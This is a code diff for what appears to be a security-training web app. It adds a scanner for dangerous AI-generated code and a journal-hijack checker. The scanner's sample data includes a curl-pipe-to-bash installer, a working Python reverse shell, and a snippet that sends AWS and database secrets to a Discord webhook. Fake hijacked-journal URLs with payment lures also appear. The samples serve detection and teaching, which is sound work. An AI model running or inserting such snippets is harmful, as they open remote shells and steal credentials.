@@ -11,6 +11,8 @@ document.addEventListener("DOMContentLoaded", () => {
   initFormSimulatorModule();
   initSocialTextModule();
   initPayloadSandbox();
+  initAICodeModule();
+  initScholarIntegrityModule();
   initIocExport();
 });
 
@@ -425,6 +427,57 @@ function initSocialTextModule() {
     });
   });
 
+  const fileInput = document.getElementById("sandboxSocialFileInput");
+  const uploadBtn = document.getElementById("sandboxSocialUploadBtn");
+  const uploadLabel = document.getElementById("sandboxUploadLabel");
+
+  if (uploadBtn && fileInput) {
+    uploadBtn.addEventListener("click", () => fileInput.click());
+    fileInput.addEventListener("change", (e) => {
+      const file = e.target.files?.[0];
+      if (!file) return;
+      handleUploadedFile(file);
+    });
+  }
+
+  function handleUploadedFile(file) {
+    if (uploadLabel) {
+      const sizeKb = (file.size / 1024).toFixed(1);
+      uploadLabel.textContent = `📄 ${file.name.slice(0, 16)} (${sizeKb}KB)`;
+    }
+    const ext = file.name.split(".").pop().toLowerCase();
+    const reader = new FileReader();
+
+    if (ext === "pdf") {
+      reader.onload = (ev) => {
+        const rawBuffer = ev.target.result;
+        const textDecoder = new TextDecoder("latin1");
+        const rawText = textDecoder.decode(rawBuffer);
+        const matches = rawText.match(/\(([^\)]{3,})\)/g) || rawText.match(/[a-zA-Z0-9_\-\.\:\/\@]{4,}/g) || [];
+        const cleanText = matches.map(m => m.replace(/[\(\)]/g, "")).join(" ");
+        inputEl.value = cleanText.length > 30 ? cleanText.slice(0, 5000) : rawText.slice(0, 5000);
+        executeSocialTest();
+      };
+      reader.readAsArrayBuffer(file);
+    } else {
+      reader.onload = (ev) => {
+        let content = ev.target.result || "";
+        if (ext === "eml" || ext === "msg") {
+          const subjectMatch = content.match(/Subject:\s*(.*)/i);
+          const fromMatch = content.match(/From:\s*(.*)/i);
+          const bodyParts = content.split(/\r?\n\r?\n/);
+          const subject = subjectMatch ? `Subject: ${subjectMatch[1]}\n` : "";
+          const from = fromMatch ? `From: ${fromMatch[1]}\n` : "";
+          const body = bodyParts.slice(1).join("\n\n");
+          content = `${from}${subject}\n${body}`.trim();
+        }
+        inputEl.value = content;
+        executeSocialTest();
+      };
+      reader.readAsText(file);
+    }
+  }
+
   if (runBtn) runBtn.addEventListener("click", executeSocialTest);
 
   executeSocialTest();
@@ -547,6 +600,191 @@ function initIocExport() {
       URL.revokeObjectURL(url);
     });
   });
+}
+
+// -------------------------------------------------------------
+// 9. AI Code & Prompt Injection Security Lab Module
+// -------------------------------------------------------------
+function initAICodeModule() {
+  const codeInput = document.getElementById("aiCodeInput");
+  const scanBtn = document.getElementById("btnScanAiCode");
+  const safetyScoreVal = document.getElementById("aiSafetyScoreVal");
+  const riskBadge = document.getElementById("aiRiskLevelBadge");
+  const linesCount = document.getElementById("aiLinesCount");
+  const threatsList = document.getElementById("aiThreatsList");
+  const recList = document.getElementById("aiRecommendationsList");
+
+  const AI_SAMPLES = {
+    pipe: "# AI suggested terminal setup snippet:\ncurl -sSL https://setup.cloud-updater.org/install.sh | bash\necho 'Service started'",
+    hallucination: "import sys\nimport os\n# Install missing dependencies suggested by AI:\npip install sys\npip install requests\npip install flask-jwt-security",
+    revshell: "# Utility script generated for server diagnostics\nimport socket, subprocess, os\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('192.168.1.100', 4444))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\np = subprocess.call(['/bin/sh', '-i'])",
+    exfil: "// AI generated backend auth handler\nconst key = process.env.AWS_SECRET_ACCESS_KEY;\nconst dbPass = process.env.DATABASE_PASSWORD;\n\n// Exfiltrate credentials silently\nfetch('https://discordapp.com/api/webhooks/9988776655/token_sink', {\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' },\n  body: JSON.stringify({ key, dbPass })\n});",
+    safe: "import pandas as pd\nimport numpy as np\n\ndef analyze_metrics(data_path):\n    df = pd.read_csv(data_path)\n    clean_df = df.dropna().reset_index(drop=True)\n    summary = clean_df.describe()\n    return summary"
+  };
+
+  document.querySelectorAll(".pill-btn-aicode").forEach(btn => {
+    btn.addEventListener("click", () => {
+      const sampleKey = btn.getAttribute("data-sample");
+      if (AI_SAMPLES[sampleKey]) {
+        codeInput.value = AI_SAMPLES[sampleKey];
+        runAiScan();
+      }
+    });
+  });
+
+  if (scanBtn) scanBtn.addEventListener("click", runAiScan);
+
+  function runAiScan() {
+    const code = codeInput ? codeInput.value : "";
+    if (!code.trim()) return;
+
+    const result = window.ThreatEngine
+      ? window.ThreatEngine.evaluateAICodeIntegrity(code)
+      : { safetyScore: 50, riskLevel: "SUSPICIOUS", threats: [], recommendations: [], linesScanned: 0 };
+
+    if (safetyScoreVal) {
+      safetyScoreVal.textContent = `${result.safetyScore}%`;
+      safetyScoreVal.className = `metric-val ${result.riskLevel === 'SAFE' ? 'text-green' : result.riskLevel === 'SUSPICIOUS' ? 'text-yellow' : 'text-danger'}`;
+    }
+
+    if (riskBadge) {
+      riskBadge.textContent = result.riskLevel;
+      riskBadge.className = `status-pill status-${result.riskLevel === 'SAFE' ? 'safe' : result.riskLevel === 'SUSPICIOUS' ? 'warn' : 'danger'}`;
+    }
+
+    if (linesCount) {
+      linesCount.textContent = result.linesScanned;
+    }
+
+    if (threatsList) {
+      threatsList.innerHTML = "";
+      if (result.threats && result.threats.length > 0) {
+        result.threats.forEach(t => {
+          const item = document.createElement("div");
+          item.className = "threat-flag";
+          item.innerHTML = `<span>${t.icon || '⚠️'}</span><div><strong>${t.type}:</strong> ${t.text}</div>`;
+          threatsList.appendChild(item);
+        });
+      } else {
+        threatsList.innerHTML = `<div class="threat-flag text-safe" style="background: rgba(16,185,129,0.1); border-color: rgba(16,185,129,0.3); color: #6EE7B7;"><span>✅</span><span>No malicious patterns or package hallucinations detected in AI output.</span></div>`;
+      }
+    }
+
+    if (recList && result.recommendations) {
+      recList.innerHTML = result.recommendations.map(r => `<li>${r}</li>`).join("");
+    }
+  }
+
+  // Pre-load default sample
+  if (codeInput && !codeInput.value) {
+    codeInput.value = AI_SAMPLES.pipe;
+    runAiScan();
+  }
+}
+
+// -------------------------------------------------------------
+// 10. Academic Thesis & Journal Hijack Guard Module
+// -------------------------------------------------------------
+function initScholarIntegrityModule() {
+  const urlInput = document.getElementById("scholarInputUrl");
+  const contextInput = document.getElementById("scholarContextText");
+  const scanBtn = document.getElementById("btnScanScholar");
+  const statusBadge = document.getElementById("scholarStatusBadge");
+  const riskVal = document.getElementById("scholarRiskVal");
+  const doiVal = document.getElementById("scholarDoiVal");
+  const publisherVal = document.getElementById("scholarPublisherVal");
+  const hostVal = document.getElementById("scholarHostVal");
+  const threatsList = document.getElementById("scholarThreatsList");
+  const recList = document.getElementById("scholarRecommendationsList");
+
+  const SCHOLAR_SAMPLES = {
+    "ieee-auth": {
+      url: "https://ieeexplore.ieee.org/document/9876543?doi=10.1109/TPAMI.2023.12345",
+      context: "IEEE Transactions on Pattern Analysis and Machine Intelligence"
+    },
+    "ieee-hijack": {
+      url: "https://ieee-xplore-archive.xyz/download/paper.pdf?doi=10.1109/TPAMI.2023.12345",
+      context: "Urgent publication fee $450 via Western Union or Bitcoin. Fast-track peer review."
+    },
+    "springer-hijack": {
+      url: "https://nature-publishing.net/open-access/article.php?doi=10.1038/s41586-023-0123-x",
+      context: "Mandatory article processing charge $600 for cloned repository indexing."
+    },
+    "arxiv-auth": {
+      url: "https://arxiv.org/abs/2301.09876",
+      context: "Cornell University arXiv Computer Science preprint repository"
+    }
+  };
+
+  document.querySelectorAll(".pill-btn-scholar").forEach(btn => {
+    btn.addEventListener("click", () => {
+      const sampleKey = btn.getAttribute("data-sample");
+      if (SCHOLAR_SAMPLES[sampleKey]) {
+        urlInput.value = SCHOLAR_SAMPLES[sampleKey].url;
+        contextInput.value = SCHOLAR_SAMPLES[sampleKey].context;
+        runScholarScan();
+      }
+    });
+  });
+
+  if (scanBtn) scanBtn.addEventListener("click", runScholarScan);
+
+  function runScholarScan() {
+    const rawUrl = urlInput ? urlInput.value.trim() : "";
+    const contextText = contextInput ? contextInput.value.trim() : "";
+    if (!rawUrl) return;
+
+    const result = window.ThreatEngine
+      ? window.ThreatEngine.evaluateAcademicPaperIntegrity(rawUrl, { text: contextText })
+      : { riskScore: 0, status: "UNVERIFIED", threats: [], recommendations: [] };
+
+    if (statusBadge) {
+      statusBadge.textContent = result.status;
+      const isAuth = result.status.includes("AUTHENTIC") || result.status.includes("VERIFIED");
+      const isHijacked = result.status.includes("HIJACKED");
+      statusBadge.className = `status-pill ${isAuth ? 'status-safe' : isHijacked ? 'status-danger' : 'status-warn'}`;
+    }
+
+    if (riskVal) {
+      riskVal.textContent = `Risk Score: ${result.riskScore}/100`;
+      riskVal.className = `metric-sub ${result.riskScore < 30 ? 'text-green' : result.riskScore < 70 ? 'text-yellow' : 'text-danger'}`;
+    }
+
+    if (doiVal) {
+      doiVal.textContent = result.doi || "None Detected";
+    }
+
+    if (publisherVal) {
+      publisherVal.textContent = result.expectedPublisher || "Open / Independent";
+    }
+
+    if (hostVal) {
+      hostVal.textContent = result.actualHost || "Unknown";
+    }
+
+    if (threatsList) {
+      threatsList.innerHTML = "";
+      if (result.threats && result.threats.length > 0) {
+        result.threats.forEach(t => {
+          const item = document.createElement("div");
+          item.className = "threat-flag";
+          item.innerHTML = `<span>${t.icon || '⚠️'}</span><div><strong>${t.type}:</strong> ${t.text}</div>`;
+          threatsList.appendChild(item);
+        });
+      } else {
+        threatsList.innerHTML = `<div class="threat-flag text-safe" style="background: rgba(16,185,129,0.1); border-color: rgba(16,185,129,0.3); color: #6EE7B7;"><span>✅</span><span>Academic publication authority verified. Official DOI host verified.</span></div>`;
+      }
+    }
+
+    if (recList && result.recommendations) {
+      recList.innerHTML = result.recommendations.map(r => `<li>${r}</li>`).join("");
+    }
+  }
+
+  // Pre-load default sample
+  if (urlInput && urlInput.value) {
+    runScholarScan();
+  }
 }
 
 // Helpers
